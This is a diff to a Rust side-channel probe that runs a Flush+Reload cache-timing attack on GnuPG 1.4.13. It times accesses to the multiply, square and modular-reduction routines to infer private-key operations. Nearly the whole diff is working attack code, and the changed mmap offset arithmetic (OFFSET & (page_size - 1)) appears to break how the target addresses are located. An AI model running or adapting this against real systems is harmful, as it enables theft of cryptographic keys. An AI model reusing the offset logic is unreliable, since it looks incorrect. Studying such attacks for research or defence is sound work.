@@ -1,7 +1,11 @@
 extern crate colored;
 extern crate libc;
 extern crate memmap;
+extern crate page_size;
 use self::libc::sched_yield;
+use self::libc::open;
+use self::libc::close;
+use self::libc::mmap;
 use self::memmap::Mmap;
 use self::memmap::MmapOptions;
 use asm;
@@ -21,11 +25,25 @@ pub mod gpg_probe {
         let mut sqr_timings: [u64; SLOTS] = [0; SLOTS];
         let mut mod_timings: [u64; SLOTS] = [0; SLOTS];
         let gnupg = File::open("./bin/gpg-1.4.13").unwrap();
-        let gpg_mmap = unsafe { MmapOptions::new().map(&gnupg).unwrap() };
-        println!(
-            "The length of the memory map for GNUGP is {} bytes",
-            gpg_mmap.len()
-        );
+        let mul_mmap = unsafe {
+            MmapOptions::new()
+                .offset((MUL_OFFSET & (page_size::get() - 1)) as u64)
+                .map(&gnupg)
+                .unwrap()
+        };
+        let sqr_mmap = unsafe {
+            MmapOptions::new()
+                .offset((SQR_OFFSET & (page_size::get() - 1)) as u64)
+                .map(&gnupg)
+                .unwrap()
+        };
+        let mod_mmap = unsafe {
+            MmapOptions::new()
+                .offset((MOD_OFFSET & (page_size::get() - 1)) as u64)
+                .map(&gnupg)
+                .unwrap()
+        };
+        println!("{}", format!("Scanning...").bold());
         /*
             wait for threshhold
         */
@@ -33,35 +51,42 @@ pub mod gpg_probe {
             let mut start_time = asm::get_rdtsc();
             let finish_time = start_time + SLOT_TIME;
             unsafe {
-                let mapping_ptr = gpg_mmap.as_ptr();
-                let mul_time = asm::full_flush_reload_time(mapping_ptr.add(MUL_OFFSET));
-                let sqr_time = asm::full_flush_reload_time(mapping_ptr.add(SQR_OFFSET));
-                let mod_time = asm::full_flush_reload_time(mapping_ptr.add(MOD_OFFSET));
+                let mul_ptr = mul_mmap.as_ptr();
+                let sqr_ptr = sqr_mmap.as_ptr();
+                let mod_ptr = mod_mmap.as_ptr();
+                let mul_time = asm::full_flush_reload_time(mul_ptr);
+                let sqr_time = asm::full_flush_reload_time(sqr_ptr);
+                let mod_time = asm::full_flush_reload_time(mod_ptr);
                 if (mul_time as u32) < threshhold
                     || (sqr_time as u32) < threshhold
                     || (mod_time as u32) < threshhold
                 {
+                    println!("Threshold found\n");
+                    mul_timings[0] = mul_time;
+                    sqr_timings[0] = sqr_time;
+                    mod_timings[0] = mod_time;
                     break;
                 }
             }
-            start_time = asm::get_rdtsc();
             while start_time < finish_time {
                 unsafe { sched_yield() };
                 start_time = asm::get_rdtsc();
             }
         }
 
-        for i in 0..SLOTS {
+        for i in 1..SLOTS {
             let mut start_time = asm::get_rdtsc();
             let finish_time = start_time + SLOT_TIME;
             unsafe {
-                compute_fr(
-                    i,
-                    &mut mul_timings,
-                    &mut sqr_timings,
-                    &mut mod_timings,
-                    &gpg_mmap,
-                );
+                let mul_ptr = mul_mmap.as_ptr();
+                let sqr_ptr = sqr_mmap.as_ptr();
+                let mod_ptr = mod_mmap.as_ptr();
+                let mul_time = asm::full_flush_reload_time(mul_ptr);
+                let sqr_time = asm::full_flush_reload_time(sqr_ptr);
+                let mod_time = asm::full_flush_reload_time(mod_ptr);
+                mul_timings[i] = mul_time;
+                sqr_timings[i] = sqr_time;
+                mod_timings[i] = mod_time;
             }
             while start_time < finish_time {
                 start_time = asm::get_rdtsc();
